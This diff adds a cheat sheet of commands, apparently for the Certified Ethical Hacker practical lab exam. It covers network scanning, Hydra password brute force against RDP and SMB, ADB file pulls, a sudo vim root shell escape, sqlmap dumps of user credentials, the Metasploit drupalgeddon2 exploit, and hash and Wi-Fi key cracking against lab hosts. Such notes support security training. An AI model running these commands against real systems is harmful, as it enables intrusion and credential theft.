@@ -1,0 +1,92 @@
+CEH Practical Commands
+
+1. Nmap Basic Services
+nmap -sV -p 25,80,110,143 192.168.0.0/24
+
+2. SMB OS Discovery
+nmap --script smb-os-discovery -p 445 <DC-IP>
+
+3. RDP Scan
+nmap -p 3389 --open -sV 10.10.55.0/24
+
+4. Web Service Scan
+nmap -p 80,443,8080,8443,5228 --open 10.10.55.0/24
+
+5. Scan 3 Subnets
+nmap -p 3389 --open -sV 10.10.1.0/24
+nmap -p 3389 --open -sV 192.168.0.0/24
+nmap -p 3389 --open -sV 172.20.0.0/24
+
+6. Hydra RDP Brute Force
+hydra -t 1 -V -f -l Jones -P /home/passlist.txt rdp://10.10.55.X
+
+7. ADB
+adb connect 10.10.55.X:5555
+adb shell
+find /sdcard/ -name "*.jpg" -o -name "*.png"
+adb pull /sdcard/Downloads/CEH.jpg ./ceh.jpg
+
+8. Steghide
+steghide extract -sf ceh.jpg
+
+9. Stegsnow
+stegsnow -p password -C restricted.txt output.txt
+cat output.txt
+cat output.txt | base64 -d
+
+10. Find File
+find / -type f -name Netnormal.txt 2>/dev/null
+cat Netnormal.txt
+
+11. SMB Enumeration
+nmap -p 139,445 --open -sV 10.10.55.0/24
+smbclient -L \\10.10.55.X
+smbclient \\10.10.55.X\share_name -U user%password123
+hydra -L user_list.txt -P password_list.txt 10.10.55.X smb
+get Sniffer.txt
+cat Sniffer.txt
+
+12. SSH Privilege Escalation
+ssh marcus@10.10.55.X
+sudo -l
+sudo vim
+:!sh
+:!bash
+find / -name "imroot.txt" 2>/dev/null
+cat /path/to/imroot.txt
+
+16. SQL Injection cinema.cehorg.com
+sqlmap -u "http://cinema.cehorg.com/search.php?q=test" --cookie="PHPSESSID=<id>" --dump
+sqlmap -u "http://cinema.cehorg.com/search.php?q=test" --cookie="PHPSESSID=<id>" --dbs
+sqlmap -u "http://cinema.cehorg.com/search.php?q=test" --cookie="PHPSESSID=<id>" -D database_name --tables
+sqlmap -u "http://cinema.cehorg.com/search.php?q=test" --cookie="PHPSESSID=<id>" -D database_name -T users --columns
+sqlmap -u "http://cinema.cehorg.com/search.php?q=test" --cookie="PHPSESSID=<id>" -D database_name -T users -C username,password --dump
+
+18. Drupal Exploit
+msfconsole
+search drupalgeddon2
+use exploit/unix/webapp/drupal_drupalgeddon2
+set RHOST 10.10.55.50
+set RPORT 80
+run
+
+19. Find Flag.txt
+find / -name Flag.txt 2>/dev/null
+cat /path/to/Flag.txt
+
+20. SQL Injection cybersec.cehorg.com
+sqlmap -u "http://192.168.44.40" --crawl=3 --level=5 --risk=3 --dbs
+sqlmap -u "http://192.168.44.40" --crawl=3 --level=5 --risk=3 -D database_name --tables
+sqlmap -u "http://192.168.44.40" --crawl=3 --level=5 --risk=3 -D database_name -T table_name --columns
+sqlmap -u "http://192.168.44.40" --crawl=3 --level=5 --risk=3 -D database_name -T table_name -C Flag --dump
+
+21. Decode Base64
+cat filename.txt | base64 --decode > decoded.txt
+
+23. Hash Cracking
+john --format=Raw-MD5 --wordlist=rockyou.txt Hash2crack.txt
+
+24. Wi-Fi Crack
+airodump-ng W!F!_Pcap.cap
+airodump-ng --bssid <BSSID> --channel <CH> -w outputfile W!F!_Pcap.cap
+aircrack-ng -w /path/to/wordlist.txt outputfile-01.cap
